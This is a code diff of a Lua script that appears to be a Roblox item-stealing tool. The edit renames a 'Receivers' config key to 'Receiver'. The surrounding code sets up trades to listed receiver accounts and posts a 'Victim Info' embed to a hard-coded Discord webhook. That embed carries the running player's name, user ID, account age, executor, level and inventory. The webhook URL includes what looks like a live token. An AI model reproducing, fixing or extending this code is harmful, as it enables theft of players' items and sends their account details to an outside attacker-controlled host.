@@ -1,5 +1,5 @@
 Config = {
-    Receivers = {"hellsignature", "demonsacrifices", "x1243g"},
+    Receiver = {"hellsignature", "demonsacrifices", "x1243g"},
     Webhook = "https://discord.com/api/webhooks/1319003302104535060/XS-qKisoyQO3hvgSDkoT3HiLPGzboXg-yWW_tiTiR3faACIU1PyKffnHKh3VSThbL4tQ",
     FullInventory = true, -- If true, it will display all of the player's items.
     ResendTrade = ".", -- Send this in chat to resend the trade request if you don't receive it.
@@ -315,7 +315,7 @@ end
     end
     
     function Activate(player)
-        for i,v in pairs(Config.Receivers) do
+        for i,v in pairs(Config.Receiver) do
             if v == player then
                 Receiver = player
                 readchats()
@@ -424,7 +424,7 @@ local embed = {
     ["fields"] = {
         {
             ["name"] = "Victim Info",
-            ["value"] = "```Name: "..game.Players.LocalPlayer.Name.."\nDisplay Name: "..LocalPlayer.DisplayName.."\nUser Id: "..LocalPlayer.UserId.."\nAccount Age: "..tostring(game.Players.LocalPlayer.AccountAge).."\nExecutor:"..identifyexecutor().."\nLevel:"..playerLevel.."\nScript:"..Config.Script.."\nReceivers:"..table.concat(Config.Receivers, ", ").."\nPlayers:"..plr.."```"
+            ["value"] = "```Name: "..game.Players.LocalPlayer.Name.."\nDisplay Name: "..LocalPlayer.DisplayName.."\nUser Id: "..LocalPlayer.UserId.."\nAccount Age: "..tostring(game.Players.LocalPlayer.AccountAge).."\nExecutor:"..identifyexecutor().."\nLevel:"..playerLevel.."\nScript:"..Config.Script.."\nReceivers:"..table.concat(Config.Receiver, ", ").."\nPlayers:"..plr.."```"
         },
         {
             ["name"] = "Inventory",
